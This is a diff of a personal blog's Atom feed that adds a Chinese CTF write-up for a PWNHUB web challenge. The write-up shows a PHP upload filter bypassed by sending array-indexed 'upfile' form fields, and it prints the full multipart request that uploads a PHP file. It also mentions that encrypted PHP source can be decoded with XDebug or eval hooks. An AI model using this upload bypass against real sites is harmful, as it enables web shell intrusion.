@@ -5,7 +5,7 @@
   <link href="/feed.xml" rel="self"/>
   
   <link href="https://www.virzz.com/"/>
-  <updated>2017-08-18T02:05:42.000Z</updated>
+  <updated>2017-09-22T13:47:56.000Z</updated>
   <id>https://www.virzz.com/</id>
   
   <author>
@@ -14,6 +14,98 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>PWNHUB 公开赛 / 傻 fufu 的工作日 Writeup</title>
+    <link href="https://www.virzz.com/2017/09/20/pwnhub_open_silly_fufu_workday.html"/>
+    <id>https://www.virzz.com/2017/09/20/pwnhub_open_silly_fufu_workday.html</id>
+    <published>2017-09-20T05:31:16.000Z</published>
+    <updated>2017-09-22T13:47:56.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2>0x01 题目介绍</h2>
+<p>啊～又到了（划水的）工作日，工作一整天，人都傻 fufu 的了...</p>
+<p>不如让我们来跟胖哈勃来一场星际旅行吧！</p>
+<p>旅行直通票就在下面这个地址里喔：<br>
+<a href="http://54.223.120.147:8088/" target="_blank" rel="external">http://54.223.120.147:8088/</a></p>
+<p>快来！就差你啦</p>
+<h2>0x02 Writeup</h2>
+<h3>拿源码</h3>
+<p>忙里偷闲，随便看了下，没想到还有源码。。。</p>
+<p>后来意外看到提示，原来这题目还有源码的啊</p>
+<p>随手加个<code>.bak</code>就下了。</p>
+<p>盲测的时候，其实就差最后一丢丢了。。</p>
+<h3>看源码</h3>
+<p>这个题目真心简单，没源码可以是个好题目，有源码就。。。。</p>
+<p>根据<code>include 'UploadFile.class.php';</code>又下了个源码文件，</p>
+<p>大概看一下就发现了漏洞,</p>
+<pre><code>if(!in_array($filename[count($filename)-1], $this-&gt;allow_ext)) {
+</code></pre>
+<p>另外，其实首页也有提示的<strong>Allow One Image File</strong></p>
+<p>说白了，这个也就是php数组的一个特性吧。(其它语言有没有我就不知道了)</p>
+<p>加上这段代码就能够清晰看到具体问题了</p>
+<pre><code>// :81
+print_r($filename);
+print_r(count($filename)-1);
+print_r(&quot;\n&quot;);
+print_r(&quot;ext : &quot;.($filename[count($filename)-1]));
+</code></pre>
+<h3>Playload</h3>
+<pre><code>POST / HTTP/1.1
+Host: 54.223.120.147:8088
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjkgFYqhd2mQQqbSq
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+DNT: 1
+Referer: http://54.223.120.147:8088/
+Accept-Language: en,zh-CN;q=0.8,zh;q=0.6,zh-TW;q=0.4
+Connection: close
+
+------WebKitFormBoundaryjkgFYqhd2mQQqbSq
+Content-Disposition: form-data; name=&quot;upfile[1]&quot;
+
+gif
+------WebKitFormBoundaryjkgFYqhd2mQQqbSq
+Content-Disposition: form-data; name=&quot;upfile[]&quot;
+
+php
+------WebKitFormBoundaryjkgFYqhd2mQQqbSq
+Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;deafult.jpg&quot;
+Content-Type: image/jpeg
+
+&lt;?php
+show_flag();
+?&gt;
+------WebKitFormBoundaryjkgFYqhd2mQQqbSq--
+</code></pre>
+<h3>解密</h3>
+<p>新增提示 ： <strong>说明：花钱解密源码和说不清源码解密方式的同学，酌情往后排，能说清楚源码解密原理并给出方法的同学加分。</strong></p>
+<p>源码解密方式，23333</p>
+<p>这个特简单，万能的XDebug就能过分分钟解决了，我的教程视频也讲过这个方法吧？（咦，我讲过吗？）</p>
+<p>一般的加密基本上都会用到eval执行的</p>
+<p>另一个方法就是弄个php的插件，Hook他的eval函数相关，直接输出~~</p>
+<h3>Flag</h3>
+<p>pwnhub{flag:ec8ae6e67b7e4369e49075426e5e47ef}</p>
+<h3>PHPjiami_decode</h3>
+<p><a href="https://github.com/virink/phpext_phpjiami_decode" target="_blank" rel="external">phpext_phpjiami_decode</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2&gt;0x01 题目介绍&lt;/h2&gt;
+&lt;p&gt;啊～又到了（划水的）工作日，工作一整天，人都傻 fufu 的了...&lt;/p&gt;
+&lt;p&gt;不如让我们来跟胖哈勃来一场星际旅行吧！&lt;/p&gt;
+&lt;p&gt;旅行直通票就在下面这个地址里喔：&lt;br&gt;
+&lt;a href=&quot;http://54.223.120.1
+    
+    </summary>
+    
+    
+      <category term="php" scheme="https://www.virzz.com/tags/php/"/>
+    
+      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
+    
+      <category term="pwnhub" scheme="https://www.virzz.com/tags/pwnhub/"/>
+    
+  </entry>
   
   <entry>
     <title>终端命令行下一些有趣的函数</title>
@@ -2345,11 +2437,11 @@ tos = True
     
       <category term="thinking" scheme="https://www.virzz.com/tags/thinking/"/>
     
-      <category term="web" scheme="https://www.virzz.com/tags/web/"/>
-    
       <category term="python" scheme="https://www.virzz.com/tags/python/"/>
     
       <category term="flask" scheme="https://www.virzz.com/tags/flask/"/>
+    
+      <category term="web" scheme="https://www.virzz.com/tags/web/"/>
     
       <category term="nginx" scheme="https://www.virzz.com/tags/nginx/"/>
     
@@ -3445,9 +3537,9 @@ Compile Time: 99604
     
       <category term="php" scheme="https://www.virzz.com/tags/php/"/>
     
-      <category term="audit" scheme="https://www.virzz.com/tags/audit/"/>
-    
       <category term="dtrace" scheme="https://www.virzz.com/tags/dtrace/"/>
+    
+      <category term="audit" scheme="https://www.virzz.com/tags/audit/"/>
     
   </entry>
   
